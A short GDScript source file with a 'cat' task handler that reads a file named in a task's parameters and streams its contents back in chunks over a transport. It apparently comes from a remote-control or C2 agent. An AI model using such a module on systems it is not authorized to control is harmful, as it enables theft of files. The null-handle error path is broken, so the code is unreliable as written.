extends Node

func _on_tasking_cat(transport, task):
	# TODO: spawn a thread?
	var test_json_conv = JSON.new()
	test_json_conv.parse(task.get("parameters"))
	var parameters = test_json_conv.get_data()
	var file_path = parameters.get("path")
	var file_size = 0
	var position = 0
	var chunk

	var file_handle = FileAccess.open(file_path , FileAccess.READ)

	if file_handle == null or not file_handle.is_open():
		chunk = "Error code: %d\nFile: %s" % [file_handle.get_error(), file_path]
	else:
		file_path = file_handle.get_path_absolute()
		file_size = file_handle.get_length()
	
	var completed = false
	var chunk_size = 8192

	while not completed:
		position = file_handle.get_position()

		if position < file_size:
			completed = false

			var next_chunk_size = chunk_size

			if position + chunk_size > file_size:
				next_chunk_size = file_size - position

			chunk = file_handle.get_buffer(next_chunk_size).get_string_from_utf8()
		else:
			completed = true

		transport.send(
			transport.create_task_response(
				true,
				completed,
				task.get("id"),
				chunk, # TODO: ensure we use the correct encoding...
			)
		)
